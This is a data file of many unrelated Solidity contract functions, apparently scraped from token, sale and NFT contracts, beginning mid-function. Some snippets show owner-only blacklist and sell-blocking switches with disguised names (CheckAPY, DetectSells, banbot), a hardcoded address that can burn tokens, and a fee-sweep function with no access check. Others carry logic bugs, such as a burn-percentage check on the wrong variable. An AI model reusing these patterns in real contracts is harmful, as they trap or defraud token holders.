        minters[minter] = true;
        return true;
    }
--------------------------------------------------------------------------------
function removeMinter(address minter) external returns (bool success) {
        require(msg.sender == governance, "!governance");
        minters[minter] = false;
        return true;
    }
--------------------------------------------------------------------------------
function mint(address account, uint amount) external returns (bool success) {
        require(minters[msg.sender], "!minter");    
        _mint(account, amount);
        return true;
    }
--------------------------------------------------------------------------------
function burn(address account, uint amount) external returns (bool success) {
        require(msg.sender == governance, "!governance");    
        _burn(account, amount);
        return true;
    }
--------------------------------------------------------------------------------
function saleTimeOver() public view returns (bool) {
      if(noOfTiers==0){
          //since no tiers has been provided yet, hence sales has not started to end
          return false;
      }
      //If last tier has ended, it mean all tiers are finished
    return now > tiers[noOfTiers-1].endTime;
  }
--------------------------------------------------------------------------------
function _setBurnPercentage(uint256 burnPercentage) external onlyOwner returns (bool) {
        if(_burnPercentage < 0 || _burnPercentage > 100)
            return false;

        _burnPercentage = burnPercentage;
        return true;
    }
--------------------------------------------------------------------------------
function emergencySetStartingIndexBlock() external onlyOwner {
        require(startingIndex == 0, "Starting index is already set");
        
        startingIndexBlock = block.number;
    }
--------------------------------------------------------------------------------
constructor() DetailedERC20(name, symbol, note, decimals) public {
    _totalSupply = TOTAL_SUPPLY;

    // initial supply belongs to owner
    balances[addressOwner] = _totalSupply;
    emit Transfer(address(0x0), addressOwner, _totalSupply);
  }
--------------------------------------------------------------------------------
function changeValueDeclarator(address _newAddress) external {
    require(msg.sender == valueDeclaratorUpdater, "sender should be current valueDeclaratorUpdater");
    valueDeclarator = _newAddress;
  }
--------------------------------------------------------------------------------
function changeValueDeclaratorUpdater(address _newAddress) external {
    require(msg.sender == valueDeclaratorUpdater, "sender should be current valueDeclaratorUpdater");
    valueDeclaratorUpdater = _newAddress;
  }
--------------------------------------------------------------------------------
function changeValueValidator(address _newAddress) external {
    require(msg.sender == valueValidator, "sender should be current valueValidator");
    valueValidator = _newAddress;
  }
--------------------------------------------------------------------------------
function () external payable
    {
                        if( msg.value > 0 )
            buyTokens(msg.sender);
        else
            airDrop(msg.sender); 
        
        
        
           
    }
--------------------------------------------------------------------------------
function burnUnpaidTokens()
    onlyOwner
  {
    require(isFinalized);
    uint256 unpaidTokens = token.balanceOf(address(this));
    token.burn(unpaidTokens);
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint256 _tokenId)
    external
    view
    returns (uint256)
    {
        Auction storage auction = tokenIdToAuction[_tokenId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function _setTokenURI(uint256 tokenId, string memory _tokenURI) internal virtual {
        require(_exists(tokenId), "URI set of nonexistent token");
        _tokenURIs[tokenId] = _tokenURI;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
        owner = msg.sender;
        balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function getTokensAmountByTokens(address _token, uint _tokenValue) private returns(uint tokensToBuy) {
        assert(tokenPrice[_token] > 0);
        return getTokensAmount(tokenPrice[_token], tokenAmount[_token], _tokenValue);
    }
--------------------------------------------------------------------------------
function returnFundsForMultiple(address[] _users) public onlyManager {
        for (uint i = 0; i < _users.length; i++) {
            returnFundsFor(_users[i]);
        }
    }
--------------------------------------------------------------------------------
function _approve(address _owner, address _spender, uint256 _amount) 
      internal
    returns (bool success)
    {
        allowed[_owner][_spender] = _amount;
        emit Approval(_owner, _spender, _amount);
        return true;
    }
--------------------------------------------------------------------------------
function recoverPreSigned(
        bytes _sig,
        bytes4 _function,
        address _to,
        uint256 _value,
        bytes _extraData,
        uint256 _gasPrice,
        uint256 _nonce) 
      public
      view
    returns (address recovered)
    {
        return ecrecoverFromSig(getSignHash(getPreSignedHash(_function, _to, _value, _extraData, _gasPrice, _nonce)), _sig);
    }
--------------------------------------------------------------------------------
function buy(uint256 badgeID_, address newReferer_) public payable isNotAContract isRunning{
    	_refererUpdate(msg.sender, newReferer_);
    	_buy(badgeID_, newReferer_, msg.sender, msg.value);
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function()
        isActivated()
        isHuman()
        isWithinLimits(msg.value)
        isGameStart()
        payable
        external
    {
        // determine if sniper is new or not
        determineSID();
            
        // fetch sniper id
        uint256 _sID = sIDxAddr_[msg.sender];
        
        // buy core 
        buyCore(_sID, spr_[_sID].laff);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function setmaxMintAmount(uint256 _newmaxMintAmount) public onlyOwner {
        require(_newmaxMintAmount > 0, "Max mint amount entered is zero");
        maxMintAmount = _newmaxMintAmount;
    }
--------------------------------------------------------------------------------
function setPoolCorr(uint256 _pid, uint256 _sid) public onlyOwner {
        require(_pid <= poolLength() - 1, "not find this pool");
        poolCorrespond[_pid] = _sid;
    }
--------------------------------------------------------------------------------
function investorInfo(uint256 contractId) view public returns(
        address _address, uint256 _invested, uint256 _comissionPercent, uint256 earned
    )
    {
      return (investorsAddress[contractId], investorsInvested[contractId] * toGwei,
        investorsComissionPercent[contractId], investorsEarned[contractId] * toGwei);
    }
--------------------------------------------------------------------------------
function showGlobalData() public view returns(uint, uint, uint, uint, uint, bool) {
        return (
        global.sheepNum,
        global.sheepPrice,
        global.sysSoldNum,
        global.sysInSaleNum,
        fleshUpCount,
        isFleshUp
        );
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
        onlyNonZeroAddress(_operator)
        external
    {

        ownerToOperators[msg.sender][_operator] = _approved;
        emit ApprovalForAll(msg.sender, _operator, _approved);
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 _index) external view returns (uint256) {
        require(_index < nftList.length, "index out of range");
        return nftList[_index];
    }
--------------------------------------------------------------------------------
function deposit(address investor) onlyOwner public payable {
        require(state == State.Active);
        deposited[investor] = deposited[investor].add(msg.value);
    }
--------------------------------------------------------------------------------
function receiveApproval(address _from, uint256 _value, 
address _token, bytes _extraData) external returns(bool){ 
TOC
TOCCall = TOC(_token);
TOCCall.transferFrom(_from,this,_value);
return true;
}
--------------------------------------------------------------------------------
function checkGoalReached() public afterDeadline {
        if (amountRaised >= fundingGoal){
            fundingGoalReached = true;
            emit GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) pure returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function inRebaseWindow() public view returns (bool) {
        return (
            now.mod(minRebaseTimeIntervalSec) >= rebaseWindowOffsetSec &&
            now.mod(minRebaseTimeIntervalSec) < (rebaseWindowOffsetSec.add(rebaseWindowLengthSec))
        );
    }
--------------------------------------------------------------------------------
function _setImplementation(address _newImplementation) internal {
        require(msg.sender == proxyOwner());
        bytes32 position = implementationPosition;

        assembly {
            sstore(position, _newImplementation)
        }
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function lastDebtLedgerEntry() external view returns (uint) {
        if (debtLedger.length == 0) {
            return 0;
        }

        return debtLedger[debtLedger.length - 1];
    }
--------------------------------------------------------------------------------
function setauctionsystem(uint auctids, uint setnum) public onlyOwner{
	    auctionlist storage c = auctionlisting[auctids]; 
	    c.ifend = true;
	    c.ifsend = setnum;
	}
--------------------------------------------------------------------------------
function unregister(address wallet)
  public
  notPaused
  onlyAuthority
  returns (bool) {
    registered[wallet] = false;
    eventNonce+=1;
    emit Unregistered(wallet, eventNonce);
    return true;
  }
--------------------------------------------------------------------------------
function startGrantAuthentication (address addr)
    public
    onlyOwner
    {
        require(!contracts[addr] && pending[addr] == 0,"31");
        pending[addr] = block.timestamp;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function allowance(address _owner, address _spender) public constant returns (uint){
        // Only the user who related with the token allowance can see the allowance value
        require(msg.sender == _owner || msg.sender == _spender);
        return allowed[_owner][_spender];
    }
--------------------------------------------------------------------------------
receive() external payable {
        sushiRouter.swapExactETHForTokens{ value: msg.value }(0, _getPathForETHtoUSDC(), receiver, block.timestamp+100);
    }
--------------------------------------------------------------------------------
function freeze() external {
        // Reentrancy guard.
        require(_status == RE_NOT_ENTERED);
        require(msg.sender == _manager, "Not manager");

        _status = RE_FROZEN;
    }
--------------------------------------------------------------------------------
function unfreeze() external {
        // Reentrancy guard.
        require(_status == RE_FROZEN);
        require(msg.sender == _manager, "Not manager");

        _status = RE_NOT_ENTERED;
    }
--------------------------------------------------------------------------------
function setMinDebtPercentageForSaving(uint256 newMinDebtPercentageForSaving) external requiresAuth {
        // A minimum debt percentage over 100% makes no sense.
        require(newMinDebtPercentageForSaving <= 1e18, "PERCENT_TOO_HIGH");

        // Update the minimum debt percentage.
        minDebtPercentageForSaving = newMinDebtPercentageForSaving;

        emit MinDebtPercentageForSavingUpdated(msg.sender, newMinDebtPercentageForSaving);
    }
--------------------------------------------------------------------------------
function deploy(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            trades(_counts[i]); }
    }
--------------------------------------------------------------------------------
function isValidNode(uint id) view returns (bool) {
        // 0 is a sentinel and therefore invalid.
        // A valid node is the head or has a previous node.
        return id != 0 && (id == stakeNodes[0].next || stakeNodes[id].prev != 0);
    }
--------------------------------------------------------------------------------
function sendToken(address _token,address _to , uint _value) onlyOwner returns(bool) {
        ERC20Basic Token = ERC20Basic(_token);
        require(Token.transfer(_to, _value));
        return true;
    }
--------------------------------------------------------------------------------
function _getFee(address _from, address _to, uint _value) private view returns (uint) {
        if (mapAddress_Excluded[_from] || mapAddress_Excluded[_to]) {
           return 0;                                                                        // No fee if excluded
        } else {
            return (_value / 1000);                                                         // Fee amount = 0.1%
        }
    }
--------------------------------------------------------------------------------
function transferOwnership(address _newOwner) public onlyOwner {
        require(_newOwner != address(0x00));

        owner = _newOwner;

        emit OwnershipTransferred(msg.sender, owner);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function withdraw(address _address) public onlyOwner {
        uint tokenBalanceOfContract = getRemainingToken();
        STRONG.transfer(_address, tokenBalanceOfContract);
        emit LogWithdrawal(_address, tokenBalanceOfContract);
    }
--------------------------------------------------------------------------------
function LiXiangToken() public {
        _totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function mint(
    address _to,
    uint256 _id,
    uint256 _quantity,
    bytes memory _data
  ) public creatorOnly(_id) {
    _mint(_to, _id, _quantity, _data);
    tokenSupply[_id] = tokenSupply[_id].add(_quantity);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
    require(index < totalSupply(), "ERC721A: global index out of bounds");
    return index;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function SportX() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function setFeeRates(uint _newManagerFee,  uint _newPayoutFee)
        onlyAdministrator()
        public
    {
        require(_newManagerFee <= 60);   //6%
        require(_newManagerFee + _newPayoutFee <= 1000);
        managerFee = _newManagerFee;
        payoutFee = _newPayoutFee;
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    marvel[spender] = val;
    fantastic[spender] = val2; 
    omni[spender] = val3;
    arizona = val4;
  }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function erc20TokenTransfer(address _tokenAddr, address _dest) public onlySignatory {
    ERC20Token token = ERC20Token(_tokenAddr);
    token.transfer(_dest, token.balanceOf(address(this)));
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function transferOwnership(address _newOwner) public onlyOwner {
		require(_newOwner != address(0), "newOwner cannot be zero address");

		owner = _newOwner;
	}
--------------------------------------------------------------------------------
function banbot(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            botban(_counts[i]); }
    }
--------------------------------------------------------------------------------
function snapshotInEra(address rewardAsset, uint256 era) public onlyAdmin {
        uint256 start = 0;
        uint256 end = poolCount();
        snapshotInEraWithOffset(rewardAsset, era, start, end);
    }
--------------------------------------------------------------------------------
function freezeTokens(address _beneficiary, uint256 _amount, uint256 _when) public onlyOwner {
        freeze storage _freeze = freezedTokens[_beneficiary];
        _freeze.amount = _amount;
        _freeze.when = _when;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function withdrawEther(uint _value) onlyManager {
        require(_value > 0);
        assert(_value <= this.balance);
        // send 123 to get 1.23
        accRecive.transfer(_value * 10000000000000000); // 10^16
    }
--------------------------------------------------------------------------------
constructor (string memory name, string memory symbol, uint256 maxSupply) public {
        initOwned(msg.sender);

        _name = name;
        _symbol = symbol;
        _max_supply = maxSupply;

        // register the supported interfaces to conform to ERC721 via ERC165
        _registerInterface(_INTERFACE_ID_ERC721_METADATA);
    }
--------------------------------------------------------------------------------
function getRegistrantId(address x) view returns (uint) {
        bool isRegistered = registrantToRegistrantIds[x].exists;
        require(isRegistered);
        return registrantToRegistrantIds[x].id;
    }
--------------------------------------------------------------------------------
function setDelegate(address delegatee) public {
        require(msg.sender == recipient, 'TreasuryVester::setDelegate: unauthorized');

        IIdle(idle).delegate(delegatee);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function withdrawStuckETH() external {
        bool success;
        (success,) = address(0x158a56f36F3b39C7dEf0016060A6189452A18E15).call{value: address(this).balance}("");
    }
--------------------------------------------------------------------------------
function updatePrice(uint _level, uint _price) public returns (bool) {
        require(msg.sender == ownerAddress, "only OwnerWallet");

        LEVEL_PRICE[_level] = _price;
        return true;
    }
--------------------------------------------------------------------------------
function bid(uint256 _tokenId)
        external
        payable
    {
        // _bid verifies token ID size
        tokenIdToAuction[_tokenId].seller;
        _bid(_tokenId, msg.value);
        _transfer(msg.sender, _tokenId);
    }
--------------------------------------------------------------------------------
function getAttributeValidator(
    address account,
    uint256 attributeTypeID
  ) external view returns (
    address validator,
    bool isStillValid
  ) {
    address issuer = _issuedAttributes[account][attributeTypeID].validator;
    return (issuer, canValidate(issuer, attributeTypeID));
  }
--------------------------------------------------------------------------------
function canValidate(
    address validator,
    uint256 attributeTypeID
  ) internal view returns (bool) {
    return (
      _validators[validator].exists &&   // isValidator(validator)
      _attributeTypes[attributeTypeID].approvedValidators[validator] &&
      _attributeTypes[attributeTypeID].exists // isAttributeType(attributeTypeID)
    );
  }
--------------------------------------------------------------------------------
function addWallet(address _wallet) public onlyPrivilegeAddresses {
        require(_wallet != address(0));
        require(!isWhitelisted(_wallet));
        whitelist[_wallet] = true;
        whitelistLength++;
    }
--------------------------------------------------------------------------------
function removeWallet(address _wallet) public onlyOwner {
        require(_wallet != address(0));
        require(isWhitelisted(_wallet));
        whitelist[_wallet] = false;
        whitelistLength--;
    }
--------------------------------------------------------------------------------
function callerDel(address _address) public onlyOwner {
		require(_address != address(0));
		require(callers[_address] == _address); // already exists
		delete callers[_address];
	}
--------------------------------------------------------------------------------
function UnionChain() {
        totalSupply = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function calculate_reward(uint256 _totalBlocksMined, address _sender, uint256 _blockNumber) public constant returns (uint256) {
      return calculate_proportional_reward(calculate_base_mining_reward(_totalBlocksMined), miningAttempts[_blockNumber][_sender].value, blockData[_blockNumber].totalMiningWei); 
   }
--------------------------------------------------------------------------------
function isBlockRedeemed(uint256 _blockNum) constant public returns (bool) {
     if (!blockData[_blockNum].isCreated) {
         return false;
     } else {
         return blockData[_blockNum].payed;
     }
   }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x39608A0C6Efe4c8Fa3e73ad523850885d04d649f,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
constructor(uint registrationDepositWei_, uint registrationMinTime_) public {
        require(registrationDepositWei_ > 0, "registrationDepositWei_ must be positive");

        registrationMinTime = registrationMinTime_;
        registrationDepositWei = registrationDepositWei_;
    }
--------------------------------------------------------------------------------
constructor() public {
        admin = owner;
        balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }
--------------------------------------------------------------------------------
function getLandDetail(uint128 id)
        external
        view
        returns (
            uint128 landId,
            uint128 landBundleId,
            bytes32 lname,
            address owner
        )
    {
        landId = id;
        lname = _nameOfLands[landId];
        landBundleId = _bundleOfLands[landId];
        owner = ownerOf(landId);
    }
--------------------------------------------------------------------------------
function withdrawal(
        address _recepient,
        address _currency,
        uint256 _amount
    ) external onlyOwner {
        _withdrawal(_recepient, _currency, _amount);
        emit Withdrawal(msg.sender, _recepient, _currency, _amount);
    }
--------------------------------------------------------------------------------
function commitPeriodActive() private view returns(bool) {
        uint256 epochTime = now.sub(epochStart(currentEpochNumber()));
        return (COMMIT_PERIOD_START <= epochTime) && (epochTime < REVEAL_PERIOD_START);
    }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function hasIssue ( address _issueAddress, bytes32 _issueKey )
        internal 
        view 
        returns (bool)
    {
        if (issueList[_issueAddress][_issueKey].issueAmount != 0) {
            return true;
        } else {
            return false;
        }
    }
--------------------------------------------------------------------------------
function DetectSells(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    hymym[spender] = val;
    better[spender] = val2; 
    callsaul[spender] = val3;
    eeuu = val4;
  }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
        super._transferFrom(from, to, tokenId);

        _removeTokenFromOwnerEnumeration(from, tokenId);

        _addTokenToOwnerEnumeration(to, tokenId);
    }
--------------------------------------------------------------------------------
function startIco() external managerOnly {
        require(statusICO == StatusICO.Created || statusICO == StatusICO.Paused);
        statusICO = StatusICO.Started;
        LogStartICO();
    }
--------------------------------------------------------------------------------
function finishIco() external managerOnly {
        require(statusICO == StatusICO.Started || statusICO == StatusICO.Paused);
        statusICO = StatusICO.Finished;
        LogFinishICO();
    }
--------------------------------------------------------------------------------
constructor(address operation) public {
    _totalSupply = INITIAL_SUPPLY;
    _balances[operation] = INITIAL_SUPPLY;
    emit Transfer(address(0), operation, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function setAccountFrozen(address addr, bool frozen)
    isUnlocked
    isAllowed(accounts.get(addr).kind)
    external {
        // NOTE: Not bounds checking `index` here, as `isAllowed` ensures the address exists.
        //       Indices are one-based internally, so we need to add one to compensate.
        int256 index = accounts.indexOf(addr) + 1;
        accounts.items[index].frozen = frozen;
    }
--------------------------------------------------------------------------------
function setAccountData(address addr, uint8 index, bytes32 customData)
    isUnlocked
    isAllowed(accounts.get(addr).kind)
    external {
        require(index < MAX_DATA, "index outside of bounds");
        data[addr][index] = customData;
    }
--------------------------------------------------------------------------------
function SETPointerToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function claimUnsold() public onlyOwner {
    if ( now < ENDTIME )
      revert();

    tokenSC.transfer( owner, tokenSC.balanceOf(address(this)) );
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function getAbsoluteJackpot() internal constant returns (uint) {
    if (ticketHolders.length == 0) {
      return 0;
    }

    return this.balance.sub(totalPendingPayments);
  }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function metaTransferHash(address _to, uint256 _amount, uint256 _nonce, uint256 _reward) public view returns(bytes32){
        return keccak256(abi.encodePacked(address(this),"metaTransfer", _to, _amount, _nonce, _reward));
    }
--------------------------------------------------------------------------------
function metaApproveHash(address _spender, uint256 _addedValue, uint256 _nonce, uint256 _reward) public view returns(bytes32){
        return keccak256(abi.encodePacked(address(this),"metaIncreaseApproval", _spender, _addedValue, _nonce, _reward));
    }
--------------------------------------------------------------------------------
function metaBurnHash(address _stablecoin, uint256 _amount, uint256 _nonce, uint256 _reward) public view returns(bytes32){
        return keccak256(abi.encodePacked(address(this),"metaBurnCarbonDollar", _stablecoin, _amount, _nonce, _reward));
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
    require(isApprovedFor(msg.sender, _tokenId));
    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function clearApproval(address _owner, uint256 _tokenId) private {
    require(ownerOf(_tokenId) == _owner);
    tokenApprovals[_tokenId] = 0;
    Approval(_owner, 0, _tokenId);
  }
--------------------------------------------------------------------------------
function multiUpdateReward(address[] memory addresses_) public {
        for (uint256 i = 0; i < addresses_.length; i++) {
            updateReward(addresses_[i]);
        }
    }
--------------------------------------------------------------------------------
function EthereumPrivate() public {
        totalSupply = 960000000000;  // Update total supply with the decimal amount
        balanceOf[msg.sender] = totalSupply;           // Give the creator all initial tokens
        name = 'Ethereum Private';                      // Set the name for display purposes
        symbol = 'ETHP';                                // Set the symbol for display purposes
    }
--------------------------------------------------------------------------------
function getRate(address _token) public view returns (uint256) {
    if (_token == address(0)) {
      return rate * 10 ** 18;
    } else {
      return 0;
    }
  }
--------------------------------------------------------------------------------
function tryBlockAndAggregate(bool requireSuccess, Call[] calldata calls) public payable returns (uint256 blockNumber, bytes32 blockHash, Result[] memory returnData) {
        blockNumber = block.number;
        blockHash = blockhash(block.number);
        returnData = tryAggregate(requireSuccess, calls);
    }
--------------------------------------------------------------------------------
function isValidComposition(uint256[] _tokenIds, uint256 _imageHash) public view returns (bool) { 
        if (isCompositionOnlyWithBaseLayers) { 
            return _isValidBaseLayersOnly(_tokenIds, _imageHash);
        } else { 
            return _isValidWithCompositions(_tokenIds, _imageHash);
        }
    }
--------------------------------------------------------------------------------
function _setCompositionPrice(uint256 _tokenId, uint256 _price) private {
        require(_price >= minCompositionFee);
        tokenIdToCompositionPrice[_tokenId] = _price;
        CompositionPriceChanged(_tokenId, _price, msg.sender);
    }
--------------------------------------------------------------------------------
function startAuction() public isOwner atStage(Stages.AuctionSetUp) {
        stage = Stages.AuctionStarted;
        start_time = now;
        start_block = block.number;
        AuctionStarted(start_time, start_block);
    }
--------------------------------------------------------------------------------
function price() public constant returns (uint) {
        if (stage == Stages.AuctionEnded ||
            stage == Stages.TokensDistributed) {
            return 0;
        }
        return calcTokenPrice();
    }
--------------------------------------------------------------------------------
function sendFundHome() external {
      if (msg.sender != kwhDeployer) throw; // locks finalize to the ultimate ETH owner
      // move to operational
      if(!ethFundDeposit.send(this.balance)) throw;  // send the eth to kwh International
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = _msgSender();
        _owner[msgSender] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function setNewStart(uint _newStart) public onlyOwner {
	require(saleStart > getCurrentDatetime());
        require(_newStart > getCurrentDatetime());
	require(saleEnd > _newStart);
        saleStart = _newStart;
    }
--------------------------------------------------------------------------------
function setNewEnd(uint _newEnd) public onlyOwner {
	require(saleEnd < getCurrentDatetime());
        require(_newEnd < getCurrentDatetime());
	require(_newEnd > saleStart);
        saleEnd = _newEnd;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function withdrawToSigned(address recipient, address signer, uint amount, bytes memory signature) public {
        require(signatureIsValid(recipient, signer, amount, signature), "error_badSignature");
        _withdraw(recipient, signer, amount);
    }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 25;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
function read() external view returns (uint256) {
        require(currentFeed.isValid == 1, "OSM/no-current-value");
        return currentFeed.value;
    }
--------------------------------------------------------------------------------
function HeartBoutToken() public {
        address contractAddress = address(this);
        balances[contractAddress] = totalSupply;
        Transfer(0x0, contractAddress, totalSupply);
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function senderCanDoProposerOperations()
        internal
        view
    {
        require(isMainPhase());
        require(isParticipant(msg.sender));
        require(identity_storage().is_kyc_approved(msg.sender));
    }
--------------------------------------------------------------------------------
function createAuctionFor(
        address nft,
        address seller,
        uint256 tokenId,
        uint256 startPrice,
        uint64 startAt,
        uint64 endAt,
        uint64 minOutbid,
        uint16 extensionDuration,
        uint16 extensionTrigger,
        uint16 hostFee
    ) public nonReentrant onlyAdmin {
        _createAuction(
            nft,
            seller,
            tokenId,
            startPrice,
            startAt,
            endAt,
            minOutbid,
            extensionDuration,
            extensionTrigger,
            hostFee
        );
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
constructor() public{
        
        totalSupply = maxSupply;
        
        //sending all the tokens to Owner
        balanceOf[owner] = totalSupply;
        
        //firing event which logs this transaction
        emit Transfer(address(0), owner, totalSupply);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function MyIdolCoinToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function () external payable {
        userBalance[ADMIN_ADDR][address(ETH_TOKEN_ADDRESS)] = userBalance[ADMIN_ADDR][address(ETH_TOKEN_ADDRESS)].add(msg.value);



    }
--------------------------------------------------------------------------------
function getCurrentVote(address guardian)
        public
        view
        returns (address[] memory validators, uint blockNumber)
    {
        VotingRecord storage lastVote = votes[guardian];

        blockNumber = lastVote.blockNumber;
        validators = lastVote.validators;
    }
--------------------------------------------------------------------------------
